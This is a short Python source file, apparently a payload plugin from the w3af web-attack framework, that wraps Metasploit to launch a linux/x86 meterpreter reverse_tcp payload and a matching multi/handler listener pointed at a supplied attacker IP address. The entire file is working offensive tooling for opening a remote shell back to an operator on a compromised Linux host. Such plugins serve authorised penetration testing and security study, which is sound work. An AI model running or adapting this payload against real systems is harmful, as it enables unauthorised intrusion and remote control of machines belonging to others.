from w3af.plugins.attack.payloads.payloads.metasploit import metasploit


class msf_linux_x86_meterpreter_reverse(metasploit):
    """
    This payload creates a reverse meterpreter shell in linux x86 using the
    metasploit framework.

    Usage: payload msf_reverse_x86_linux <your_ip_address>
    """
    def run_execute(self, ip_address):
        msf_args = 'linux/x86/meterpreter/reverse_tcp LHOST=%s |'
        msf_args += ' exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp'
        msf_args += ' LHOST=%s E'
        msf_args = msf_args % (ip_address, ip_address)

        api_result = self.api_execute(msf_args)
        return api_result
